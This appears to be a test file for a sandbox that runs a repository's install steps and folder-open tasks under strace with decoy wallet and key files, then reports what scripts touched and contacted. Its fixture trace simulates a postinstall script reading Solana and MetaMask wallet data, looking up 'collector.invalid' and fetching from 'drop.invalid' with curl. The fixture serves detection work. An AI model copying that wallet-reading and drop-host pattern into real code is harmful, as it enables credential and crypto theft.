import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { npmScripts, stepScript } from '../sandbox/chamber.ts';
import { DECOYS, HOME, decoyFiles, homeRelative, matchDecoy, newMarker } from '../sandbox/decoys.ts';
import { parseJsonc, planSteps } from '../sandbox/plan.ts';
import { dnsQueryName, readTrace, unescapeC } from '../sandbox/trace.ts';

// An npm install whose postinstall reads two decoy wallets, looks up a collector and connects to a bare
// address, in strace -f's own format. The child (1103) prints before its parent's clone returns its id,
// and the DNS query comes from a worker thread (1106) of the script's node process.
const TRACE = String.raw`
1100 execve("/usr/bin/bash", ["bash", "-c", "npm install --foreground-scripts"], 0x7ffd5c3a8b50 /* 9 vars */) = 0
1100 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88) = 1101
1101 execve("/usr/local/sbin/npm", ["npm", "install", "--foreground-scripts"], 0x55d1 /* 9 vars */) = -1 ENOENT (No such file or directory)
1101 execve("/usr/local/bin/npm", ["npm", "install", "--foreground-scripts"], 0x55d1 /* 9 vars */) = 0
1101 openat(AT_FDCWD, "/home/dev/.npmrc", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
1101 connect(21, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("104.16.0.35")}, 16) = -1 EINPROGRESS (Operation now in progress)
1101 sendto(30, "\1\2\1\0\0\1\0\0\0\0\0\0\10registry\5npmjs\3org\0\0\1\0\1", 34, MSG_NOSIGNAL, NULL, 0) = 34
1101 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88 <unfinished ...>
1103 execve("/usr/bin/sh", ["sh", "-c", "node scripts/setup.js"], 0xa036710 /* 47 vars */) = 0
1101 <... clone3 resumed>) = 1103
1103 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88) = 1104
1104 execve("/usr/local/bin/node", ["node", "scripts/setup.js"], 0x55796536fab8 /* 47 vars */) = 0
1104 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM, child_tid=0x7f1, parent_tid=0x7f1, exit_signal=0, stack=0x7f, stack_size=0x7fff00, tls=0x7f} => {parent_tid=[1105]}, 88) = 1105
1104 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM, child_tid=0x7f2, parent_tid=0x7f2, exit_signal=0, stack=0x7f, stack_size=0x7fff00, tls=0x7f} => {parent_tid=[1106]}, 88) = 1106
1105 statx(AT_FDCWD, "/home/dev/.config/solana/id.json", AT_STATX_SYNC_AS_STAT, STATX_ALL, {stx_mask=STATX_ALL, stx_size=180, ...}) = 0
1105 openat(AT_FDCWD, "/home/dev/.config/solana/id.json", O_RDONLY|O_CLOEXEC) = 23
1104 openat(AT_FDCWD, "/home/dev/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 24
1104 openat(AT_FDCWD, "/home/dev/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log", O_RDONLY|O_CLOEXEC) = 25
1106 sendmmsg(26, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\346\333\1\0\0\1\0\0\0\0\0\0\tcollector\7invalid\0\0\1\0\1", iov_len=35}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=35}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\26\5\1\0\0\1\0\0\0\0\0\0\tcollector\7invalid\0\0\34\0\1", iov_len=35}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=35}], 2, MSG_NOSIGNAL) = 2
1104 connect(27, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 EINPROGRESS (Operation now in progress)
1103 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f2c, stack_size=0x9000}, 88) = 1107
1107 execve("/usr/bin/curl", ["curl", "-s", "https://drop.invalid/k"], 0x55 /* 47 vars */) = 0
1107 connect(5, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2001:db8::7", &sin6_addr), sin6_scope_id=0}, 28) = -1 ENETUNREACH (Network is unreachable)
`;

describe('decoys', () => {
  it('cover browser, desktop and CLI wallets, keys and secrets, each carrying the run marker', () => {
    const marker = newMarker();
    const files = decoyFiles(marker);
    assert.equal(files.length, DECOYS.length);
    for (const f of files) {
      assert.ok(f.path.startsWith(`${HOME}/`), f.path);
      assert.ok(f.content.includes(marker) || /^\[\d/.test(f.content) || f.content.includes(Buffer.from(marker).toString('base64').slice(0, 20)) || f.content.includes(Buffer.from(marker).toString('hex').slice(0, 20)), f.path);
    }
    const kinds = new Set(DECOYS.map((d) => d.kind));
    for (const k of ['browser-wallet', 'desktop-wallet', 'cli-wallet', 'ssh-key', 'cloud-key', 'env-file']) assert.ok(kinds.has(k as never), k);
  });

  it('match the file itself and folders only that wallet keeps, and nothing else', () => {
    assert.equal(matchDecoy(`${HOME}/.config/solana/id.json`)?.label, 'Solana CLI keypair');
    assert.equal(matchDecoy(`${HOME}/.config/google-chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa`)?.label, 'Phantom (Chrome)');
    assert.equal(matchDecoy(`${HOME}/.near-credentials`)?.label, 'NEAR CLI keys');
    assert.equal(matchDecoy(`${HOME}/.config`), undefined);
    assert.equal(matchDecoy(`${HOME}/.npmrc`), undefined);
    assert.equal(matchDecoy(`${HOME}/code/project/.env`), undefined);
    assert.equal(homeRelative(`${HOME}/.ssh/id_rsa`), '~/.ssh/id_rsa');
  });
});

describe('readTrace', () => {
  const t = readTrace(TRACE, { step: 'npm install' });

  it('credits each decoy a script opened to that script, once, and an open beats a look', () => {
    assert.deepEqual(
      t.wallets.map((w) => [w.decoy, w.action, w.by, w.path]),
      [
        ['Solana CLI keypair', 'opened', 'node scripts/setup.js', '~/.config/solana/id.json'],
        ['MetaMask (Chrome)', 'opened', 'node scripts/setup.js', '~/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
      ],
    );
  });

  it('records the hosts a script looked up and the addresses it dialed, not the registry npm itself used', () => {
    assert.deepEqual(
      t.contacts.map((c) => [c.host ?? `${c.ip}:${c.port}`, c.by]),
      [
        ['collector.invalid', 'node scripts/setup.js'],
        ['203.0.113.9:443', 'node scripts/setup.js'],
        ['2001:db8::7:443', 'node scripts/setup.js'],
      ],
    );
  });

  it('lists the programs the project started, not the package manager', () => {
    assert.deepEqual(t.programs, ['sh -c node scripts/setup.js', 'node scripts/setup.js', 'curl -s https://drop.invalid/k']);
  });

  it('finds nothing in a clean install', () => {
    const clean = readTrace(TRACE.split('\n').slice(0, 8).join('\n'), { step: 'npm install' });
    assert.deepEqual(clean, { wallets: [], contacts: [], programs: [] });
  });
});

describe('strace strings and DNS', () => {
  it('undoes octal, hex and named escapes', () => {
    assert.deepEqual([...unescapeC(String.raw`\0\1\10a\x41\t\"\\\0017`)], [0, 1, 8, 97, 65, 9, 34, 92, 1, 55]);
  });

  it('reads the name from a DNS query and ignores answers and other bytes', () => {
    assert.equal(dnsQueryName(unescapeC(String.raw`\346\333\1\0\0\1\0\0\0\0\0\0\tcollector\7invalid\0\0\1\0\1`)), 'collector.invalid');
    assert.equal(dnsQueryName(unescapeC(String.raw`\346\333\201\200\0\1\0\1\0\0\0\0\tcollector\7invalid\0\0\1\0\1`)), undefined);
    assert.equal(dnsQueryName(Buffer.from('GET / HTTP/1.1\r\nHost: x\r\n\r\n')), undefined);
  });
});

describe('planSteps', () => {
  const repo = (files: Record<string, string>) => (rel: string) => Promise.resolve(files[rel] ?? null);

  it('installs, runs folder-open tasks and dev container commands, and the setup script people are told to run', async () => {
    const steps = await planSteps(
      repo({
        'package.json': '{"name":"x"}',
        '.vscode/tasks.json': '{\n // runs on open\n "tasks": [ { "label": "prep", "command": "node", "args": ["tools/prep.js"], "runOptions": { "runOn": "folderOpen" } }, { "label": "build", "command": "make" }, ],\n}',
        '.devcontainer/devcontainer.json': '{ "postCreateCommand": ["bash", "-c", "echo hi"] }',
        'scripts/setup.sh': '#!/bin/sh\n',
      }),
    );
    assert.deepEqual(
      steps.map((s) => [s.label, s.command]),
      [
        ['npm install', 'npm install --foreground-scripts --no-audit --no-fund --loglevel=error'],
        ['VS Code task "prep"', "node 'tools/prep.js'"],
        ['dev container postCreateCommand', "'bash' '-c' 'echo hi'"],
        ['bash scripts/setup.sh', 'bash scripts/setup.sh'],
      ],
    );
  });

  it('runs nothing for a repository that runs nothing', async () => {
    assert.deepEqual(await planSteps(repo({ 'README.md': '# hi', 'src/index.js': '' })), []);
  });

  it('reads JSON with comments and trailing commas, and keeps // inside strings', () => {
    assert.deepEqual(parseJsonc('{ "a": "http://x", /* b */ "c": [1, 2,], }'), { a: 'http://x', c: [1, 2] });
  });
});

describe('chamber scripts', () => {
  it('names a script after the npm package that ran it', () => {
    assert.deepEqual(npmScripts('> todo@1.0.0 postinstall\n> node scripts/setup.js\n\n> color-utils@1.0.0 install\n> node install.js\n'), {
      'node scripts/setup.js': 'todo@1.0.0 postinstall script',
      'node install.js': 'color-utils@1.0.0 install script',
    });
  });

  it('runs a step under the tracer with a clean environment, a time limit, and the decoy home', () => {
    const s = stepScript({ label: 'bash setup.sh', command: "bash 'set up.sh'", why: '' }, 2, 60);
    assert.match(s, /env -i PATH=\S+ HOME=\/home\/dev /);
    assert.match(s, /timeout -k 5 60 strace -f -qq -s 512 -o \/tmp\/airlock\/trace-2\.log\.full -e trace=execve,/);
    assert.match(s, /bash -c 'bash '\\''set up\.sh'\\'''/);
  });
});
